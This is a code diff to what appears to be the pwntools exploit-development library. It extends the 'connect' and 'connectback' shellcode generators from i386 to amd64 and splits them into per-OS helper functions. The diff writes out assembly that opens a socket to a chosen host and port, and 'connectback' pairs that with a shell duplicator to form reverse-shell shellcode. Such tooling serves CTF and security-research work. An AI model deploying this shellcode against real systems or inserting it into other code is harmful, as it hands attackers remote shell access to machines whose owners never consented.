@@ -1,19 +1,32 @@
 from pwn.internal.shellcode_helper import *
-from .. import dupsh
+from .. import dupsh, pushstr
 
-@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
+@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
 def connectback(host, port):
     """Args: host, port
     Standard connect back type shellcode."""
     return connect(host, port), dupsh()
 
-@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
-def connect(host, port, os = None):
+@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
+def connect(host, port, arch = None, os = None):
     """Args: host, port
     Connects to host on port.  Leaves socket in EBP."""
 
-    if os == 'linux':
-        return """
+    port = int(port)
+
+    if arch == 'i386':
+        if os == 'linux':
+            return _connect_linux_i386(host, port)
+        elif os == 'freebsd':
+            return _connect_freebsd_i386(host, port)
+    elif arch == 'amd64':
+        if os == 'linux':
+            return _connect_linux_amd64(host, port)
+    else:
+        no_support('connect', os, arch)
+
+def _connect_linux_i386(host, port):
+    return """
             ;; Connect to %(hostname)s on %(portnum)d
             ;; Socket file descriptor is placed in EBP
 
@@ -45,12 +58,14 @@ def connect(host, port, os = None):
             mov al, SYS_socketcall
             int 0x80
 """ % {'hostname': host,
-       'portnum' : int(port),
+       'portnum' : port,
        'host'    : ip(host),
-       'port'    : htons(int(port))
+       'port'    : htons(port)
        }
-    elif os == 'freebsd':
-        return """
+
+
+def _connect_freebsd_i386(host, port):
+    return """
             ;; Connect to %(hostname)s on %(portnum)d
             ;; Socket file descriptor is placed in EBP
 
@@ -81,5 +96,26 @@ def connect(host, port, os = None):
        'host'    : ip(host),
        'port'    : htons(int(port))
        }
-    else:
-        bug('OS was neither linux nor freebsd')
+
+def _connect_linux_amd64(host, port):
+    sock = pwn.asm('dw AF_INET, %d' % htons(port)) + p32(ip(host))
+
+    return '''
+push SYS64_socket
+pop rax
+push AF_INET
+pop rdi
+push SOCK_STREAM
+pop rsi
+cdq  ;; rdx = IPPROTO_IP (=0)
+syscall
+mov ebp, eax
+''' + pushstr(sock, raw = True) + '''
+mov edi, ebp
+mov rsi, rsp
+push 16
+pop rdx
+push SYS64_connect
+pop rax
+syscall
+'''
